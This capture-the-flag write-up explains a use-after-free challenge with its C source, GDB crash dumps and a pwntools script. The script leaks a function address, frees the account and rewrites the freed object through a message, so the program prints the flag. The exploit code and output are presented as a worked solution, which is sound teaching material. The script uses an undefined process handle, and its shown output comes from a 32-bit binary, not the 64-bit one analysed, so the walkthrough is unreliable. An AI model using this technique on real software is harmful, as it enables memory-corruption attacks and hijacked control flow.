# Unsubscriptions Are Free
Ths programs starts with this:<br><br>
```
Welcome to my stream! ^W^
==========================
(S)ubscribe to my channel
(I)nquire about account deletion
(M)ake an Twixer account
(P)ay for premium membership
(l)eave a message(with or without logging in)
(e)xit
```
Subscribing to the channel will result in a memory leak:<br>

```
Welcome to my stream! ^W^
==========================
(S)ubscribe to my channel
(I)nquire about account deletion
(M)ake an Twixer account
(P)ay for premium membership
(l)eave a message(with or without logging in)
(e)xit
s
OOP! Memory leak...0x401965
```
<br>
From the function below, it can be seen that leaked memory address is for the function hahaexploitgobrrr()

```c
void s(){
 	printf("OOP! Memory leak...%p\n",hahaexploitgobrrr);
 	puts("Thanks for subsribing! I really recommend becoming a premium member!");
}
```
This function contains the flag:

```c
void hahaexploitgobrrr(){
 	char buf[FLAG_BUFFER];
 	FILE *f = fopen("flag.txt","r");
 	fgets(buf,FLAG_BUFFER,f);
 	fprintf(stdout,"%s\n",buf);
 	fflush(stdout);
}
```
The function below shows that function that inputs the username.
<br>

```c
char * getsline(void) {
	getchar();
	char * line = malloc(100), * linep = line;
	size_t lenmax = 100, len = lenmax;
	int c;
	if(line == NULL)
		return NULL;
	for(;;) {
		c = fgetc(stdin);
		if(c == EOF)
			break;
		if(--len == 0) {
			len = lenmax;
			char * linen = realloc(linep, lenmax *= 2);

			if(linen == NULL) {
				free(linep);
				return NULL;
			}
			line = linen + (line - linep);
			linep = linen;
		}

		if((*line++ = c) == '\n')
			break;
	}
	*line = '\0';
	return linep;
}
```
<br>
It shows that the function stores the username dynamically. Furthemore, the function below handles the deletion of an account.
<br>

```c
void i(){
	char response;
  	puts("You're leaving already(Y/N)?");
	scanf(" %c", &response);
	if(toupper(response)=='Y'){
		puts("Bye!");
		free(user);
	}else{
		puts("Ok. Get premium membership please!");
	}
}
```
<br>
As can be seen from the function above, the function frees the dynamically allocated memory from the heap. This is a potential vulnerability that can be used later on.
<br>
The function below is the function for leaving messages. Take note that it also stores text dynamically.
<br>

```c
void leaveMessage(){
	puts("I only read premium member messages but you can ");
	puts("try anyways:");
	char* msg = (char*)malloc(8);
	read(0, msg, 8);
}
```
<br>

## Thought Process
When we attempt to leave a message without creating an account, it results in segmentation error. <br>
<br>

```
Welcome to my stream! ^W^
==========================
(S)ubscribe to my channel
(I)nquire about account deletion
(M)ake an Twixer account
(P)ay for premium membership
(l)eave a message(with or without logging in)
(e)xit
l
I only read premium member messages but you can 
try anyways:
AAA
zsh: segmentation fault  ./chal3
```
<br>
However, GDB can be used to inspect the segmentation error.<br>

```
[ Legend: Modified register | Code | Heap | Stack | String ]
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x0               
$rbx   : 0x00007fffffffddf8  →  0x00007fffffffe194  →  "COLORFGBG=15;0"
$rcx   : 0x000000000042d2bd  →  0x5b77fffff0003d48 ("H="?)
$rdx   : 0x0               
$rsp   : 0x00007fffffffdbf8  →  0x0000000000401aeb  →  <doProcess+001a> nop 
$rbp   : 0x00007fffffffdc10  →  0x00007fffffffdc20  →  0x0000000000000001
$rsi   : 0x00000000004c5c00  →  0x000000000a414141 ("AAA\n"?)
$rdi   : 0x00000000004c57d0  →  0x0000000000000000
$rip   : 0x0               
$r8    : 0x0               
$r9    : 0x00000000004bc500  →  <_IO_2_1_stdin_+0000> mov BYTE PTR [rdx], ah
$r10   : 0x00000000004be091  →   add BYTE PTR [rax], al
$r11   : 0x246             
$r12   : 0x00007fffffffdde8  →  0x00007fffffffe179  →  "/home/john/Downloads/chal3"
$r13   : 0x00000000004b8de8  →  0x0000000000401930  →  <frame_dummy+0000> endbr64 
$r14   : 0x1               
$r15   : 0x1               
$eflags: [zero carry PARITY adjust sign trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00 
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007fffffffdbf8│+0x0000: 0x0000000000401aeb  →  <doProcess+001a> nop          ← $rsp
0x00007fffffffdc00│+0x0008: 0x00000000004b8de8  →  0x0000000000401930  →  <frame_dummy+0000> endbr64 
0x00007fffffffdc08│+0x0010: 0x00000000004c57d0  →  0x0000000000000000
0x00007fffffffdc10│+0x0018: 0x00007fffffffdc20  →  0x0000000000000001    ← $rbp
0x00007fffffffdc18│+0x0020: 0x0000000000401e38  →  <main+004c> jmp 0x401e15 <main+41>
0x00007fffffffdc20│+0x0028: 0x0000000000000001
0x00007fffffffdc28│+0x0030: 0x00000000004022f4  →  <__libc_start_call_main+0064> mov edi, eax
0x00007fffffffdc30│+0x0038: 0x0000000000401100  →  <_IO_fflush.cold+0000> test DWORD PTR [rbx], 0x8000
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
[!] Cannot disassemble from $PC
[!] Cannot access memory at address 0x0
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "chal3", stopped 0x0 in ?? (), reason: SIGSEGV

```
<br>
Nothing note worthy. However, freeing a dynamically allocated memory results in a vulnerabiliy, therefore an attempt to create an account and then freeing the account 
must be inspected.
<br>

```
Welcome to my stream! ^W^
==========================
(S)ubscribe to my channel
(I)nquire about account deletion
(M)ake an Twixer account
(P)ay for premium membership
(l)eave a message(with or without logging in)
(e)xit
m
===========================
Registration: Welcome to Twixer!
Enter your username: 
prince
Account created.
Welcome to my stream! ^W^
==========================
(S)ubscribe to my channel
(I)nquire about account deletion
(M)ake an Twixer account
(P)ay for premium membership
(l)eave a message(with or without logging in)
(e)xit
i
You're leaving already(Y/N)?
y
Bye!
Welcome to my stream! ^W^
==========================
(S)ubscribe to my channel
(I)nquire about account deletion
(M)ake an Twixer account
(P)ay for premium membership
(l)eave a message(with or without logging in)
(e)xit
l
I only read premium member messages but you can 
try anyways:
AAA
zsh: segmentation fault  ./chal3
```

```
[ Legend: Modified register | Code | Heap | Stack | String ]
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x0               
$rbx   : 0x00007fffffffddf8  →  0x00007fffffffe194  →  "COLORFGBG=15;0"
$rcx   : 0x000000000042d2bd  →  0x5b77fffff0003d48 ("H="?)
$rdx   : 0xa414141         
$rsp   : 0x00007fffffffdbf8  →  0x0000000000401aeb  →  <doProcess+001a> nop 
$rbp   : 0x00007fffffffdc10  →  0x00007fffffffdc20  →  0x0000000000000001
$rsi   : 0x00000000004c57d0  →  0x000000000a414141 ("AAA\n"?)
$rdi   : 0x00000000004c57d0  →  0x000000000a414141 ("AAA\n"?)
$rip   : 0xa414141         
$r8    : 0x0               
$r9    : 0x00000000004bc500  →  <_IO_2_1_stdin_+0000> mov BYTE PTR [rdx], ah
$r10   : 0x00000000004be091  →   add BYTE PTR [rax], al
$r11   : 0x246             
$r12   : 0x00007fffffffdde8  →  0x00007fffffffe179  →  "/home/john/Downloads/chal3"
$r13   : 0x00000000004b8de8  →  0x0000000000401930  →  <frame_dummy+0000> endbr64 
$r14   : 0x1               
$r15   : 0x1               
$eflags: [zero carry PARITY adjust sign trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00 
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007fffffffdbf8│+0x0000: 0x0000000000401aeb  →  <doProcess+001a> nop          ← $rsp
0x00007fffffffdc00│+0x0008: 0x00000000004b8de8  →  0x0000000000401930  →  <frame_dummy+0000> endbr64 
0x00007fffffffdc08│+0x0010: 0x00000000004c57d0  →  0x000000000a414141 ("AAA\n"?)
0x00007fffffffdc10│+0x0018: 0x00007fffffffdc20  →  0x0000000000000001    ← $rbp
0x00007fffffffdc18│+0x0020: 0x0000000000401e38  →  <main+004c> jmp 0x401e15 <main+41>
0x00007fffffffdc20│+0x0028: 0x0000000000000001
0x00007fffffffdc28│+0x0030: 0x00000000004022f4  →  <__libc_start_call_main+0064> mov edi, eax
0x00007fffffffdc30│+0x0038: 0x0000000000401100  →  <_IO_fflush.cold+0000> test DWORD PTR [rbx], 0x8000
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
[!] Cannot disassemble from $PC
[!] Cannot access memory at address 0xa414141
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "chal3", stopped 0xa414141 in ?? (), reason: SIGSEGV
```
<br>
Take note that the memory address of the next function call/return address is different than the previous attempt. Additionally, the hexadecimal '414141' corresponds 
to the ASCII 'AAA' which was the message left earlier. Meaning there is a possibility of changing the return address of the next function call.
This can be exploited by changing the address to the hahaexploitgobrrr() function which will result in the function being called and in printing the flag.
This can be done by converting the address of the hahaexploutgobrrr() into ascii/bytes and feeding it into the buffer/message. This can be done using pwntools. <br><br>

```python
    from pwn import *
    import time
    elf = ELF('./vuln')
    libc = elf.libc
    #p = process(elf.path)
    p.sendline('s')
    p.recvuntil("OOP! Memory leak...")
    leaks = p.recvline().strip().decode()
    leaks = leaks.split('\n')
    print(leaks[0])
    memory_address = int(leaks[0], 16)
    payload = p64(memory_address)
    time.sleep(1)
    p.sendline('m')
    time.sleep(1)
    p.sendline('prince')
    time.sleep(1)
    p.sendline('i')
    time.sleep(1)
    p.sendline('y')
    time.sleep(1)
    p.sendline('l')
    time.sleep(1)
    p.sendline(payload)
    print(payload)
    p.interactive()
```
<br>


p.sendline('s') subscribes to the channel<br>
p.recvuntil("OOP! Memory leak...") will get the memory leak<br>
p64(memory_address) converts the memory address into ASCII or bytes<br>
p.sendline('m') is to make an account<br>
p.sendline('prince') to name the account 'prince'<br>
p.sendline('i') to delete the account<br>
p.sendline('y') to confirm the deletion<br>
p.sendline('l') to leave a message<br>
p.sendline(payload) to send the memory address that has been converted to ASCII/bytes<br><br>


    $ python solve.py  
    [*] '/home/john/practicectf/vuln'
        Arch:       i386-32-little
        RELRO:      Partial RELRO
        Stack:      Canary found
        NX:         NX enabled
        PIE:        No PIE (0x8048000)
        Stripped:   No
    [*] '/usr/lib32/libc.so.6'
        Arch:       i386-32-little
        RELRO:      Full RELRO
        Stack:      Canary found
        NX:         NX enabled
        PIE:        PIE enabled
    [+] Starting local process '/home/john/practicectf/vuln': pid 214630
    /home/john/practicectf/solve.py:7: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
      p.sendline('s')
    /home/john/practicectf/solve.py:8: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
      p.recvuntil("OOP! Memory leak...")
    0x80487d6
    /home/john/practicectf/solve.py:15: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
      p.sendline('m')
    /home/john/practicectf/solve.py:17: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
      p.sendline('prince')
    /home/john/practicectf/solve.py:19: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
      p.sendline('i')
    /home/john/practicectf/solve.py:21: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
      p.sendline('y')
    /home/john/practicectf/solve.py:23: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
      p.sendline('l')
    b'\xd6\x87\x04\x08\x00\x00\x00\x00'
    [*] Switching to interactive mode
    Thanks for subsribing! I really recommend becoming a premium member!
    Welcome to my stream! ^W^
    ==========================
    (S)ubscribe to my channel
    (I)nquire about account deletion
    (M)ake an Twixer account
    (P)ay for premium membership
    (l)eave a message(with or without logging in)
    (e)xit
    ===========================
    Registration: Welcome to Twixer!
    Enter your username: 
    Account created.
    Welcome to my stream! ^W^
    ==========================
    (S)ubscribe to my channel
    (I)nquire about account deletion
    (M)ake an Twixer account
    (P)ay for premium membership
    (l)eave a message(with or without logging in)
    (e)xit
    You're leaving already(Y/N)?
    Bye!
    Welcome to my stream! ^W^
    ==========================
    (S)ubscribe to my channel
    (I)nquire about account deletion
    (M)ake an Twixer account
    (P)ay for premium membership
    (l)eave a message(with or without logging in)
    (e)xit
    I only read premium member messages but you can 
    try anyways:
    CITU{CWE_416_USE_AFTER_FREE}
    
    Welcome to my stream! ^W^
    ==========================
    (S)ubscribe to my channel
    (I)nquire about account deletion
    (M)ake an Twixer account
    (P)ay for premium membership
    (l)eave a message(with or without logging in)
    (e)xit
The flag has now been outputted.
